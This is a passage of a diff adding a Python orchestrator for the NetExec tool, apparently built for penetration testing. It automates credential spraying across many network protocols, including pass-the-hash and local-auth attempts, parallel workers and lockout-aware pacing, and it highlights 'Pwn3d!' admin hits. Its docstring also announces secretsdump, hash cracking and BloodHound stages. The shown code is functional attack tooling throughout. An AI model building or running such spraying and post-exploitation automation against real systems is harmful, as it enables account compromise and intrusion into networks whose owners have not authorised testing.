@@ -1,0 +1,1706 @@
+"""NxcAutomator — the orchestrator that drives the whole pipeline:
+spray → live results → detect DC → post-exploit enum/modules/secretsdump →
+crack → BloodHound → exports."""
+
+import os
+import random
+import shlex
+import shutil
+import subprocess
+import sys
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from pathlib import Path
+from threading import Lock
+
+from .bloodhound import BloodHoundRunner
+from .cache import HostCache
+from .constants import (ALL_PROTOCOLS, AUTH_RESPONSE_PATTERNS, BANNER_WIDTH,
+                        BLUE, BOLD, CACHE_DEFAULT_PATH, CACHE_DEFAULT_TTL,
+                        CONNECTIVITY_TIMEOUT_PATTERNS, CRACK_DEFAULT_TIMEOUT,
+                        CYAN, DEFAULT_WORKERS, DIM, GREEN, HASH_AUTH_PROTOCOLS,
+                        HASH_DUMP_LINE_RE, HASH_LMNT_PATTERN, HASH_NT_PATTERN,
+                        ICON_BLOODHOUND, ICON_CRACK, ICON_FAIL, ICON_FINDING,
+                        ICON_HARVEST, ICON_HOST, ICON_NOOP, ICON_OK,
+                        ICON_PWN3D, ICON_SKIP, ICON_SUBTASK, ICON_TIMEOUT,
+                        ICON_WARN, KERBEROS_AUTH_PROTOCOLS,
+                        KRB_AS_REP_USER_RE, KRB_TGS_REP_USER_RE,
+                        LDAP_ENUM_ACTIONS, LOCAL_AUTH_PROTOCOLS,
+                        LOCKOUT_DURATION_RE, LOCKOUT_THRESHOLD_RE, MAX_RETRY,
+                        NETEXEC_TIMEOUT, NULL_SESSION_CREDS, PROTOCOL_PORTS,
+                        RED, RESET, ROCKYOU_DOWNLOAD_URL, SMB_DOMAIN_RE,
+                        SMB_ENUM_ACTIONS, SMB_NAME_RE, SMB_SECRETS_ACTIONS,
+                        SUBPROCESS_TIMEOUT, V_DEBUG, V_NORMAL, V_QUIET,
+                        V_VERBOSE, WORDLIST_DEFAULT_PATHS, YELLOW,
+                        AttemptClassification, ParsedStatus, TaskKey)
+from .cracker import HashCracker
+from .loot import LootStore
+from .scanner import NmapScanner
+from .types import Credential, NxcActionResult
+from ._utils import _term_width, _truncate_path
+
+
+class NxcAutomator:
+    """Run nxc across all protocols with combination or linear credential pairing."""
+
+    def __init__(
+        self,
+        target: str,
+        user: str | None = None,
+        password: str | None = None,
+        nthash: str | None = None,
+        combo: str | None = None,
+        domain: str | None = None,
+        kerberos: bool = False,
+        null_session: bool = False,
+        output: str | None = None,
+        workers: int = DEFAULT_WORKERS,
+        mode: str = "combination",
+        nmap_enabled: bool = False,
+        cache_enabled: bool = True,
+        cache_ttl: int = CACHE_DEFAULT_TTL,
+        cache_path: str | None = None,
+        scan_only: bool = False,
+        verbosity: int = V_NORMAL,
+        enum_enabled: bool = False,
+        modules: str | None = None,
+        bloodhound_enabled: bool = False,
+        bloodhound_force: bool = False,
+        bloodhound_ttl: int = CACHE_DEFAULT_TTL,
+        loot_dir: str = "loot",
+        cmd_log: str | None = None,
+        cmd_log_disabled: bool = False,
+        delay: float = 0.0,
+        jitter: float = 0.0,
+        netexec_timeout: int = NETEXEC_TIMEOUT,
+        subprocess_timeout: int = SUBPROCESS_TIMEOUT,
+        max_retry: int = MAX_RETRY,
+        stop_on_success: bool = False,
+        only_protocols: str | None = None,
+        exclude_protocols: str | None = None,
+        secretsdump: bool = False,
+        grow_combo: str | None = None,
+        export_json: str | None = None,
+        export_csv: str | None = None,
+        crack_enabled: bool = False,
+        wordlist: str | None = None,
+        cracker: str = "auto",
+        crack_rules: str | None = None,
+        crack_timeout: int = CRACK_DEFAULT_TIMEOUT,
+        strict: bool = False,
+    ):
+        self.targets = self._read_value_or_file(target)
+        self.mode = mode.lower()
+        self.domain = domain
+        self.kerberos = kerberos
+        self.null_session = null_session
+
+        self.user_arg = user
+        self.password_arg = password
+        self.hash_arg = nthash
+        self.combo_arg = combo
+
+        # Kept for banner display
+        self.users = self._read_value_or_file(user) if user else []
+        self.passwords = self._read_value_or_file(password) if password else []
+        self.hashes = self._read_value_or_file(nthash) if nthash else []
+
+        self.credentials = self._build_credentials()
+
+        self.workers = workers
+        self.delay = max(0.0, delay)
+        self.jitter = max(0.0, jitter)
+        self.netexec_timeout = netexec_timeout
+        self.subprocess_timeout = subprocess_timeout
+        self.max_retry = max_retry
+        self.stop_on_success = stop_on_success
+        self.only_protocols = self._parse_protocol_set(only_protocols, "only")
+        self.exclude_protocols = self._parse_protocol_set(exclude_protocols, "exclude") or set()
+        self.lock = Lock()
+        self.cmd_log_lock = Lock()
+        self.completed = 0
+        self.total_tasks = 0
+        ts = datetime.now().strftime("%H-%M-%S-%f")[:-3]
+        self.log_file = output if output else f"{ts}.txt"
+        if cmd_log_disabled:
+            self.cmd_log_path: Path | None = None
+        else:
+            self.cmd_log_path = Path(cmd_log) if cmd_log else Path(f"commands-{ts}.log")
+        self._cmd_log_initialized = False
+
+        self.verbosity = verbosity
+        self.nmap_enabled = nmap_enabled
+        self.scan_only = scan_only
+        self.scanner = (
+            NmapScanner(ports=self._all_known_ports(), log_cmd=self._log_command)
+            if nmap_enabled else None
+        )
+        # Cache is also useful for DC/bloodhound dedup even without --nmap.
+        cache_useful = (nmap_enabled or bloodhound_enabled) and cache_enabled
+        resolved_cache_path = Path(cache_path).expanduser() if cache_path else CACHE_DEFAULT_PATH
+        self.cache = HostCache(resolved_cache_path, ttl=cache_ttl) if cache_useful else None
+
+        self.enum_enabled = enum_enabled
+        self.modules = [m.strip() for m in modules.split(",") if m.strip()] if modules else []
+        self.loot = LootStore(Path(loot_dir))
+        self.bloodhound_enabled = bloodhound_enabled
+        self.bloodhound_runner = (
+            BloodHoundRunner(
+                self.cache, self.loot,
+                ttl=bloodhound_ttl, force=bloodhound_force,
+                log_cmd=self._log_command,
+            )
+            if bloodhound_enabled else None
+        )
+
+        self.secretsdump = secretsdump
+        self.grow_combo_path = Path(grow_combo) if grow_combo else None
+        self.export_json_path = Path(export_json) if export_json else None
+        self.export_csv_path = Path(export_csv) if export_csv else None
+
+        self.crack_enabled = crack_enabled
+        self.cracker = (
+            HashCracker(self.loot, wordlist=wordlist, cracker=cracker,
+                        rules=crack_rules, timeout=crack_timeout,
+                        log_cmd=self._log_command)
+            if crack_enabled else None
+        )
+        self.cracked_creds: list[dict] = []  # post-crack (user, plain) records
+        self.strict = strict
+        self.strict_errors: list[str] = []
+
+        # Cross-host state populated during the run.
+        self.valid_creds: list[dict] = []
+        self.domain_hosts: dict[str, set[str]] = {}  # domain → {hostnames}
+        self.host_domain: dict[str, str] = {}        # host → domain
+        self.harvested_hashes: list[dict] = []       # auto-secretsdump output
+        self.lockout_warnings: list[dict] = []       # detected pass-pol findings
+        self.started_at = datetime.now()
+
+    @staticmethod
+    def _parse_protocol_set(value: str | None, flag: str) -> set[str] | None:
+        """Parse a comma-separated protocol list, validating against ALL_PROTOCOLS."""
+        if not value:
+            return None
+        protos = {p.strip().lower() for p in value.split(",") if p.strip()}
+        unknown = protos - set(ALL_PROTOCOLS)
+        if unknown:
+            raise ValueError(
+                f"--{flag}: unknown protocol(s) {sorted(unknown)}. "
+                f"Valid: {', '.join(ALL_PROTOCOLS)}"
+            )
+        return protos
+
+    @staticmethod
+    def _all_known_ports() -> list[int]:
+        seen: list[int] = []
+        for ports in PROTOCOL_PORTS.values():
+            for port in ports:
+                if port not in seen:
+                    seen.append(port)
+        return seen
+
+    def _vprint(self, level: int, msg: str):
+        """Emit msg only when current verbosity >= level. Plays nice with the progress bar."""
+        if self.verbosity < level:
+            return
+        with self.lock:
+            sys.stderr.write("\r" + " " * _term_width() + "\r")
+            sys.stderr.flush()
+            print(msg, flush=True)
+            self._redraw_progress()
+
+    def _vprint_cmd(self, label: str, cmd: list[str]):
+        """Verbose: dump the command line about to be executed."""
+        self._vprint(V_VERBOSE, f"  {DIM}$ [{label}] {shlex.join(cmd)}{RESET}")
+
+    def _log_command(self, label: str, cmd: list[str], target: str | None = None):
+        """Append a shell-pasteable copy of cmd to commands.log AND emit verbose dump.
+
+        Format is OSCP-report friendly: comment header with timestamp + label,
+        followed by the exact command (shell-quoted), one entry per call."""
+        self._vprint_cmd(label, cmd)
+        if not self.cmd_log_path:
+            return
+        with self.cmd_log_lock:
+            mode = "a" if self._cmd_log_initialized else "w"
+            with open(self.cmd_log_path, mode) as fh:
+                if not self._cmd_log_initialized:
+                    fh.write(
+                        "# NetExec Automator — commands transcript\n"
+                        f"# Started: {datetime.now().isoformat(timespec='seconds')}\n"
+                        "# Each block: '# <iso ts> [label] target=<host>' followed by\n"
+                        "# the exact shell-quoted command. Safe to copy-paste into reports.\n\n"
+                    )
+                    self._cmd_log_initialized = True
+                ts_iso = datetime.now().isoformat(timespec="seconds")
+                tgt = f" target={target}" if target else ""
+                fh.write(f"# {ts_iso} [{label}]{tgt}\n")
+                fh.write(shlex.join(cmd) + "\n\n")
+
+    @staticmethod
+    def _read_lines(path: str) -> list[str]:
+        with open(path) as f:
+            return [line.strip() for line in f if line.strip()]
+
+    @classmethod
+    def _read_value_or_file(cls, source: str) -> list[str]:
+        """Return direct value as one-item list, or load non-empty lines from file."""
+        return cls._read_lines(source) if os.path.isfile(source) else [source]
+
+    @staticmethod
+    def _auth_scope(local_auth: bool) -> str:
+        return "local" if local_auth else "domain"
+
+    def _task_label(self, protocol: str, local_auth: bool) -> str:
+        """Return standardized display label for protocol/auth scope."""
+        return f"{protocol.upper()} ({self._auth_scope(local_auth)})"
+
+    def _build_protocol_tasks(self, open_ports: set[int] | None = None) -> list[TaskKey]:
+        """Generate (protocol, local_auth) tasks. Filters by --only / --exclude
+        and (when --nmap is on) drops protocols whose mapped ports are all closed."""
+        tasks: list[TaskKey] = []
+        for protocol in ALL_PROTOCOLS:
+            if self.only_protocols and protocol not in self.only_protocols:
+                continue
+            if protocol in self.exclude_protocols:
+                continue
+            if open_ports is not None:
+                mapped = PROTOCOL_PORTS.get(protocol, [])
+                if not any(p in open_ports for p in mapped):
+                    continue
+            tasks.append((protocol, False))
+            if protocol in LOCAL_AUTH_PROTOCOLS:
+                tasks.append((protocol, True))
+        return tasks
+
+    @staticmethod
+    def _parse_hash_value(value: str) -> tuple[str | None, str]:
+        """Return (lmhash, nthash). Raises if format is invalid."""
+        v = value.strip()
+        if HASH_LMNT_PATTERN.match(v):
+            lm, nt = v.split(":", 1)
+            return lm, nt
+        if HASH_NT_PATTERN.match(v):
+            return None, v
+        raise ValueError(
+            f"Invalid hash {v!r}: expected 32 hex chars (NT) or 32:32 hex (LM:NT)."
+        )
+
+    @classmethod
+    def _parse_combo_line(cls, line: str) -> Credential | None:
+        """Parse one 'user:secret' line. Auto-detects whether secret is NT/LM:NT hash
+        or password. Returns None for blank or comment lines."""
+        raw = line.rstrip("\n\r")
+        stripped = raw.strip()
+        if not stripped or stripped.startswith("#"):
+            return None
+        if ":" not in stripped:
+            raise ValueError(f"Malformed combo line (missing ':'): {stripped!r}")
+        user, _, secret = raw.partition(":")
+        user = user.strip()
+        # Don't strip the secret — passwords may legitimately have surrounding whitespace.
+        if HASH_LMNT_PATTERN.match(secret.strip()):
+            lm, nt = secret.strip().split(":", 1)
+            return Credential(user=user, lmhash=lm, nthash=nt)
+        if HASH_NT_PATTERN.match(secret.strip()):
+            return Credential(user=user, nthash=secret.strip())
+        return Credential(user=user, password=secret)
+
+    @classmethod
+    def _load_combo_file(cls, path: str) -> list[Credential]:
+        creds: list[Credential] = []
+        with open(path) as fh:
+            for lineno, line in enumerate(fh, start=1):
+                try:
+                    cred = cls._parse_combo_line(line)
+                except ValueError as exc:
+                    raise ValueError(f"{path}:{lineno}: {exc}") from None
+                if cred is not None:
+                    creds.append(cred)
+        if not creds:
+            raise ValueError(f"Combo file {path!r} contained no usable credentials.")
+        return creds
+
+    def _build_credentials(self) -> list[Credential]:
+        """Compose the credential list from null/guest, combo file, or -u/-p/-H pools."""
+        creds: list[Credential] = []
+
+        # Null-session and Guest/anonymous fast-checks go first (cheapest signals).
+        if self.null_session:
+            creds.extend(Credential(user=u, password=p) for u, p in NULL_SESSION_CREDS)
+
+        if self.combo_arg:
+            if self.password_arg or self.hash_arg or self.user_arg:
+                raise ValueError("--combo cannot be combined with -u/-p/-H.")
+            creds.extend(self._load_combo_file(self.combo_arg))
+            return creds
+
+        # If only null-session was requested (no -u), that's a valid configuration.
+        if not self.user_arg:
+            if creds:
+                return creds
+            raise ValueError(
+                "Provide credentials via -u/-p, -u/-H, --combo, or --null-session."
+            )
+
+        if not self.password_arg and not self.hash_arg:
+            raise ValueError("With -u you must also provide -p, -H, or use --combo.")
+
+        if self.mode == "combination":
+            for u in self.users:
+                for p in self.passwords:
+                    creds.append(Credential(user=u, password=p))
+                for h in self.hashes:
+                    lm, nt = self._parse_hash_value(h)
+                    creds.append(Credential(user=u, lmhash=lm, nthash=nt))
+            return creds
+
+        if self.mode == "linear":
+            if self.passwords and self.hashes:
+                raise ValueError(
+                    "Linear mode accepts -p or -H, not both. Use --combo for mixed lists."
+                )
+            pool = self.passwords or self.hashes
+            if len(self.users) != len(pool):
+                raise ValueError(
+                    "Linear mode requires user and secret lists to have the same length."
+                )
+            if self.passwords:
+                creds.extend(Credential(user=u, password=p) for u, p in zip(self.users, pool))
+            else:
+                for u, h in zip(self.users, pool):
+                    lm, nt = self._parse_hash_value(h)
+                    creds.append(Credential(user=u, lmhash=lm, nthash=nt))
+            return creds
+
+        raise ValueError(f"Unsupported mode: {self.mode}")
+
+    def _redraw_progress(self):
+        if self.total_tasks > 0:
+            bar_len = 20
+            filled = int(bar_len * self.completed / self.total_tasks)
+            bar = f"{'█' * filled}{'░' * (bar_len - filled)}"
+            pct = int(100 * self.completed / self.total_tasks)
+            sys.stderr.write(f"\r  {DIM}{bar} {pct:3d}% ({self.completed}/{self.total_tasks}){RESET}")
+            sys.stderr.flush()
+
+    def _update_progress(self):
+        with self.lock:
+            self.completed += 1
+            self._redraw_progress()
+
+    def _skip_progress(self, count: int):
+        with self.lock:
+            self.completed += count
+            self._redraw_progress()
+
+    def _print_live(self, msg: str):
+        """Print a finding in real-time, temporarily clearing the progress bar."""
+        with self.lock:
+            sys.stderr.write("\r" + " " * _term_width() + "\r")
+            sys.stderr.flush()
+            print(msg, flush=True)
+            self._redraw_progress()
+
+    def _build_nxc_command(
+        self, protocol: str, target: str, credential: Credential, local_auth: bool
+    ) -> list[str]:
+        cmd = ["nxc", protocol, target, *credential.to_cli_args()]
+        if local_auth:
+            cmd.append("--local-auth")
+        elif self.domain:
+            # -d is only meaningful for domain auth (and gets ignored / rejected with --local-auth)
+            cmd.extend(["-d", self.domain])
+        if self.kerberos and not local_auth and protocol in KERBEROS_AUTH_PROTOCOLS:
+            cmd.append("-k")
+        cmd.extend(["--timeout", str(self.netexec_timeout), "--log", self.log_file])
+        return cmd
+
+    @staticmethod
+    def _credential_supported(credential: Credential, protocol: str) -> bool:
+        """Skip hash creds on protocols nxc doesn't expose -H for (ssh/ftp/vnc/nfs)."""
+        if credential.is_hash and protocol not in HASH_AUTH_PROTOCOLS:
+            return False
+        return True
+
+    @staticmethod
+    def _is_pwn3d(msg: str) -> bool:
+        """nxc appends '(Pwn3d!)' when the auth grants admin on the host."""
+        return "(Pwn3d!)" in msg or "(pwn3d!)" in msg.lower()
+
+    def _report_success_lines(self, stdout: str, protocol: str, local_auth: bool):
+        for raw_line in stdout.split("\n"):
+            marker, msg = self._parse_nxc_line(raw_line.strip())
+            if marker == "[+]":
+                label = self._task_label(protocol, local_auth)
+                if self._is_pwn3d(msg):
+                    # Loud red banner for admin-on-host — this is the report-worthy line.
+                    self._print_live(
+                        f"  {RED}{BOLD}💀 PWN3D! {label}{RESET} "
+                        f"{RED}{BOLD}{msg}{RESET}"
+                    )
+                else:
+                    self._print_live(
+                        f"  {GREEN}{BOLD}⚡ {label}{RESET} {GREEN}{msg}{RESET}"
+                    )
+            elif marker == "[-]" and self.verbosity >= V_VERBOSE:
+                label = self._task_label(protocol, local_auth)
+                self._vprint(V_VERBOSE, f"  {DIM}✘ {label} {msg}{RESET}")
+            elif marker == "[*]" and self.verbosity >= V_DEBUG:
+                label = self._task_label(protocol, local_auth)
+                self._vprint(V_DEBUG, f"  {DIM}* {label} {msg}{RESET}")
+
+    @staticmethod
+    def _parse_status_blocks(blocks: list[str]) -> list[ParsedStatus]:
+        parsed: list[ParsedStatus] = []
+        for block in blocks:
+            for line in block.split("\n"):
+                line = line.strip()
+                if not line:
+                    continue
+                marker, msg = NxcAutomator._parse_nxc_line(line)
+                if marker in ("[+]", "[-]", "[!]"):
+                    parsed.append((marker, msg))
+        return parsed
+
+    @staticmethod
+    def _status_icon(parsed: list[ParsedStatus]) -> str:
+        has_success = any(marker == "[+]" for marker, _ in parsed)
+        has_skip = any(marker == "[!]" for marker, _ in parsed)
+        if has_success:
+            return f"{GREEN}✔{RESET}"
+        if has_skip:
+            return f"{YELLOW}⏱{RESET}"
+        return f"{RED}✘{RESET}"
+
+    @staticmethod
+    def _contains_any_pattern(text: str, patterns: tuple[str, ...]) -> bool:
+        return any(pattern in text for pattern in patterns)
+
+    def _classify_attempt_output(self, stdout: str, stderr: str) -> AttemptClassification:
+        """Classify one nxc run to decide timeout skip behavior."""
+        combined = "\n".join(part for part in (stdout, stderr) if part).lower()
+        if not combined:
+            return "ambiguous"
+
+        # Credential-related failures mean the service responded, so they should
+        # not contribute to consecutive connectivity timeout skips.
+        if self._contains_any_pattern(combined, AUTH_RESPONSE_PATTERNS):
+            return "credential_response"
+
+        if self._contains_any_pattern(combined, CONNECTIVITY_TIMEOUT_PATTERNS):
+            return "connectivity_timeout"
+
+        for raw_line in (stdout + "\n" + stderr).split("\n"):
+            marker, _ = self._parse_nxc_line(raw_line.strip())
+            if marker in ("[+]", "[-]", "[*]", "[!]"):
+                return "credential_response"
+
+        return "ambiguous"
+
+    def _format_stderr_block(self, stderr: str, fallback_marker: str) -> str | None:
+        """Convert stderr lines to parseable status lines for result summary."""
+        formatted: list[str] = []
+        for raw_line in stderr.split("\n"):
+            line = raw_line.strip()
+            if not line:
+                continue
+            marker, msg = self._parse_nxc_line(line)
+            if marker in ("[+]", "[-]", "[!]"):
+                formatted.append(f"{marker} {msg}")
+            else:
+                formatted.append(f"{fallback_marker} {line}")
+        return "\n".join(formatted) if formatted else None
+
+    def _sleep_between_attempts(self):
+        """Optional pacing between credential attempts for lockout-safety / low-power."""
+        if self.delay <= 0 and self.jitter <= 0:
+            return
+        nap = self.delay + (random.uniform(0, self.jitter) if self.jitter > 0 else 0)
+        if nap > 0:
+            time.sleep(nap)
+
+    def _run_protocol_task(self, protocol: str, target: str, local_auth: bool = False) -> list[str]:
+        """Run all credential pairs for one protocol/auth-type, return captured output."""
+        output_lines: list[str] = []
+        timeout_count = 0
+        total_per_task = len(self.credentials)
+        ran = 0
+        for idx, credential in enumerate(self.credentials):
+            if idx > 0:
+                self._sleep_between_attempts()
+            if not self._credential_supported(credential, protocol):
+                # Hash creds aren't usable on ssh/ftp/vnc/nfs — count as done, move on.
+                self._vprint(
+                    V_VERBOSE,
+                    f"  {DIM}↷ skip {self._task_label(protocol, local_auth)} "
+                    f"for hash-only cred {credential.user!r}{RESET}",
+                )
+                ran += 1
+                self._update_progress()
+                continue
+            cmd = self._build_nxc_command(protocol, target, credential, local_auth)
+            self._log_command(self._task_label(protocol, local_auth), cmd, target=target)
+            try:
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.subprocess_timeout)
+                stdout = (result.stdout or "").strip()
+                stderr = (result.stderr or "").strip()
+                classification = self._classify_attempt_output(stdout, stderr)
+
+                if stdout:
+                    output_lines.append(stdout)
+                    self._report_success_lines(stdout, protocol, local_auth)
+
+                # stderr often carries connection errors; include it when stdout is empty
+                # or when we classified this attempt as a connectivity timeout.
+                if stderr and (not stdout or classification == "connectivity_timeout"):
+                    marker = "[!]" if classification == "connectivity_timeout" else "[-]"
+                    stderr_block = self._format_stderr_block(stderr, marker)
+                    if stderr_block:
+                        output_lines.append(stderr_block)
+
+                if classification == "connectivity_timeout":
+                    timeout_count += 1
+                else:
+                    timeout_count = 0
+
+                # Stop-on-success: bail out of this protocol/host as soon as we
+                # see a [+] line, so we don't keep trying the rest of the
+                # credentials (and risk account lockout).
+                if self.stop_on_success and "[+]" in stdout:
+                    ran += 1
+                    self._update_progress()
+                    remaining = total_per_task - ran
+                    if remaining > 0:
+                        self._skip_progress(remaining)
+                    label = self._task_label(protocol, local_auth)
+                    self._vprint(
+                        V_VERBOSE,
+                        f"  {DIM}↷ stop-on-success: {label} → skipping "
+                        f"remaining {remaining} cred(s) on this host{RESET}",
+                    )
+                    return output_lines
+            except subprocess.TimeoutExpired:
+                timeout_count += 1
+
+            ran += 1
+            self._update_progress()
+
+            if timeout_count >= self.max_retry:
+                # Skip remaining credentials for this protocol after repeated timeouts.
+                output_lines.append(f"[!] {self.max_retry} consecutive timeouts — skipped")
+                label = self._task_label(protocol, local_auth)
+                self._print_live(
+                    f"  {YELLOW}⏱ {label}{RESET} {DIM}{self.max_retry} consecutive timeouts — skipping{RESET}"
+                )
+                remaining = total_per_task - ran
+                if remaining > 0:
+                    self._skip_progress(remaining)
+                break
+        return output_lines
+
+    @staticmethod
+    def _parse_nxc_line(line: str) -> tuple[str | None, str]:
+        """Extract status marker and message from nxc output.
+
+        'SMB  10.x.x.x  445  DC01  [+] dom\\user:pass' -> ('[+]', 'dom\\user:pass')
+        """
+        for marker in ("[+]", "[-]", "[*]", "[!]"):
+            idx = line.find(marker)
+            if idx != -1:
+                return marker, line[idx + 4:].strip()
+        return None, line.strip()
+
+    @staticmethod
+    def _extract_target_info(results: dict) -> str | None:
+        """Get first [*] info line to display target OS/host details once."""
+        for blocks in results.values():
+            for block in blocks:
+                for line in block.split("\n"):
+                    if "[*]" in line:
+                        idx = line.find("[*]")
+                        return line[idx + 4:].strip()
+        return None
+
+    def _credential_summary(self) -> str:
+        """Compact one-liner describing credential composition for the banner."""
+        null_users = {u for u, _ in NULL_SESSION_CREDS}
+        n_pwd = sum(
+            1 for c in self.credentials
+            if not c.is_hash and c.user not in null_users
+        )
+        n_hash = sum(1 for c in self.credentials if c.is_hash)
+        n_quick = sum(1 for c in self.credentials if c.user in null_users and not c.is_hash)
+        parts: list[str] = []
+        if n_pwd:
+            parts.append(f"{n_pwd} pwd")
+        if n_hash:
+            parts.append(f"{n_hash} hash")
+        if n_quick:
+            parts.append(f"{n_quick} anon (null/guest)")
+        return " · ".join(parts) if parts else "—"
+
+    def _auth_options_summary(self) -> str:
+        parts: list[str] = []
+        if self.domain:
+            parts.append(f"domain={self.domain}")
+        if self.kerberos:
+            parts.append("kerberos")
+        if self.null_session:
+            parts.append("null-session")
+        if self.combo_arg:
+            parts.append(f"combo={os.path.basename(self.combo_arg)}")
+        return " · ".join(parts) if parts else "—"
+
+    def _post_exploit_summary(self) -> str:
+        parts: list[str] = []
+        if self.enum_enabled:
+            parts.append("enum(smb+ldap)")
+        if self.modules:
+            parts.append(f"modules={','.join(self.modules)}")
+        if self.secretsdump:
+            parts.append("secretsdump")
+        if self.crack_enabled:
+            parts.append("crack")
+        if self.bloodhound_enabled:
+            parts.append("bloodhound")
+        return " · ".join(parts) if parts else "—"
+
+    def _print_scan_banner(self, total_attempts: int):
+        nmap_status = "ON" if self.nmap_enabled else "OFF"
+        cache_status = "ON" if self.cache else ("OFF" if (self.nmap_enabled or self.bloodhound_enabled) else "n/a")
+        verbosity_label = {V_DEBUG: "DEBUG", V_VERBOSE: "VERBOSE", V_NORMAL: "NORMAL", V_QUIET: "QUIET"}.get(self.verbosity, "NORMAL")
+        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
+        print(f"  {CYAN}{BOLD}⚡ NetExec Automator{RESET}")
+        print(f"{'═' * BANNER_WIDTH}")
+        print(f"  Targets Count   {DIM}│{RESET} {BOLD}{len(self.targets):<11}{RESET} Protocols {DIM}│{RESET} {BOLD}{len(ALL_PROTOCOLS)}{RESET} (+ local auth)")
+        print(f"  Credentials     {DIM}│{RESET} {BOLD}{len(self.credentials):<11}{RESET} Workers   {DIM}│{RESET} {BOLD}{self.workers}{RESET}")
+        print(f"  Composition     {DIM}│{RESET} {BOLD}{self._credential_summary()}{RESET}")
+        print(f"  Auth Options    {DIM}│{RESET} {BOLD}{self._auth_options_summary()}{RESET}")
+        print(f"  Pairing Mode    {DIM}│{RESET} {BOLD}{self.mode.upper():<11}{RESET} Log File  {DIM}│{RESET} {BOLD}{_truncate_path(self.log_file)}{RESET}")
+        print(f"  Nmap Pre-scan   {DIM}│{RESET} {BOLD}{nmap_status:<11}{RESET} Cache     {DIM}│{RESET} {BOLD}{cache_status}{RESET}")
+        print(f"  Post-Exploit    {DIM}│{RESET} {BOLD}{self._post_exploit_summary()}{RESET}")
+        print(f"  Verbosity       {DIM}│{RESET} {BOLD}{verbosity_label:<11}{RESET} Loot Dir  {DIM}│{RESET} {BOLD}{_truncate_path(self.loot.root)}{RESET}")
+        cmd_log_str = _truncate_path(self.cmd_log_path) if self.cmd_log_path else "disabled"
+        print(f"  Command Log     {DIM}│{RESET} {BOLD}{cmd_log_str}{RESET}")
+        pacing = []
+        if self.delay > 0 or self.jitter > 0:
+            pacing.append(f"delay={self.delay}s±{self.jitter}s")
+        if self.netexec_timeout != NETEXEC_TIMEOUT or self.subprocess_timeout != SUBPROCESS_TIMEOUT or self.max_retry != MAX_RETRY:
+            pacing.append(f"nxc-to={self.netexec_timeout}s")
+            pacing.append(f"py-to={self.subprocess_timeout}s")
+            pacing.append(f"retry={self.max_retry}")
+        if pacing:
+            print(f"  Pacing          {DIM}│{RESET} {BOLD}{' · '.join(pacing)}{RESET}")
+        filters: list[str] = []
+        if self.only_protocols:
+            filters.append(f"only={','.join(sorted(self.only_protocols))}")
+        if self.exclude_protocols:
+            filters.append(f"exclude={','.join(sorted(self.exclude_protocols))}")
+        if self.stop_on_success:
+            filters.append("stop-on-success")
+        if filters:
+            print(f"  Filters         {DIM}│{RESET} {BOLD}{' · '.join(filters)}{RESET}")
+        if self.crack_enabled and self.cracker:
+            wl = self.cracker.find_wordlist()
+            wl_str = _truncate_path(wl) if wl else "missing"
+            print(f"  Cracking        {DIM}│{RESET} {BOLD}{self.cracker.cracker() or '?'} · wordlist={wl_str}"
+                  + (f" · rules={Path(self.cracker.rules).name}" if self.cracker.rules else "")
+                  + f"{RESET}")
+        if self.scan_only:
+            print(f"  {YELLOW}{BOLD}⚠ scan-only mode — no auth attempts will run{RESET}")
+        else:
+            print(f"  Total Tasks     {DIM}│{RESET} {BOLD}~{total_attempts}{RESET} {DIM}(upper bound, filtered by nmap){RESET}" if self.nmap_enabled else f"  Total Tasks     {DIM}│{RESET} {BOLD}{total_attempts}{RESET}")
+        print(f"{'═' * BANNER_WIDTH}\n")
+
+    def _collect_target_results(self, target: str, tasks: list[TaskKey], pair_count: int) -> dict[TaskKey, list[str]]:
+        self.completed = 0
+        self.total_tasks = len(tasks) * pair_count
+        results: dict[TaskKey, list[str]] = {}
+
+        # Each future handles one protocol/auth scope task and runs all credentials sequentially.
+        with ThreadPoolExecutor(max_workers=self.workers) as pool:
+            futures: dict = {}
+            for protocol, local_auth in tasks:
+                fut = pool.submit(self._run_protocol_task, protocol, target, local_auth)
+                futures[fut] = (protocol, local_auth)
+
+            for future in as_completed(futures):
+                key = futures[future]
+                try:
+                    results[key] = future.result()
+                except FileNotFoundError as exc:
+                    # A required binary (likely nxc) vanished mid-run.
+                    msg = f"required command not found: {exc.filename or exc}"
+                    results[key] = [f"[!] {msg}"]
+                    self._record_error(msg)
+                except PermissionError as exc:
+                    msg = f"permission denied: {exc.filename or exc}"
+                    results[key] = [f"[!] {msg}"]
+                    self._record_error(msg)
+                except MemoryError:
+                    msg = "out of memory (subprocess output too large)"
+                    results[key] = [f"[!] {msg}"]
+                    self._record_error(msg)
+                except Exception as exc:
+                    msg = f"{type(exc).__name__}: {exc}"
+                    results[key] = [f"[!] unexpected error: {msg}"]
+                    self._record_error(msg)
+        return results
+
+    def _print_target_results(self, results: dict[TaskKey, list[str]], tasks: list[TaskKey]):
+        target_info = self._extract_target_info(results)
+
+        print(f"\n{'─' * BANNER_WIDTH}")
+        print(f"  {CYAN}{BOLD}📋 NetExec Automator Results{RESET}")
+        print(f"{'─' * BANNER_WIDTH}")
+
+        if target_info:
+            print(f"    {DIM}{target_info}{RESET}")
+        print()
+
+        successes: list[tuple[str, str]] = []
+        # Track no-response by protocol name so domain/local variants collapse into one line.
+        no_output_protos: set[str] = set()
+
+        for protocol, local_auth in tasks:
+            key = (protocol, local_auth)
+            label = self._task_label(protocol, local_auth)
+            blocks = results.get(key, [])
+
+            if not blocks:
+                no_output_protos.add(protocol.upper())
+                continue
+
+            # Keep only user-facing status lines from raw nxc output.
+            parsed = self._parse_status_blocks(blocks)
+
+            if not parsed:
+                no_output_protos.add(protocol.upper())
+                continue
+
+            icon = self._status_icon(parsed)
+
+            for i, (marker, msg) in enumerate(parsed):
+                if i == 0:
+                    prefix = f"  {icon} {BOLD}{label:<20}{RESET}"
+                else:
+                    prefix = f"      {'':<20}"
+
+                if marker == "[+]":
+                    if self._is_pwn3d(msg):
+                        print(f"{prefix} {RED}{BOLD}💀 {msg}{RESET}")
+                    else:
+                        print(f"{prefix} {GREEN}{msg}{RESET}")
+                    successes.append((label, msg))
+                elif marker == "[-]":
+                    print(f"{prefix} {DIM}{msg}{RESET}")
+                elif marker == "[!]":
+                    print(f"{prefix} {YELLOW}{msg}{RESET}")
+
+        if no_output_protos:
+            ordered = [p for p in ALL_PROTOCOLS if p.upper() in no_output_protos]
+            names = ", ".join(p.upper() for p in ordered)
+            print(f"\n  {DIM}── No response: {names}{RESET}")
+
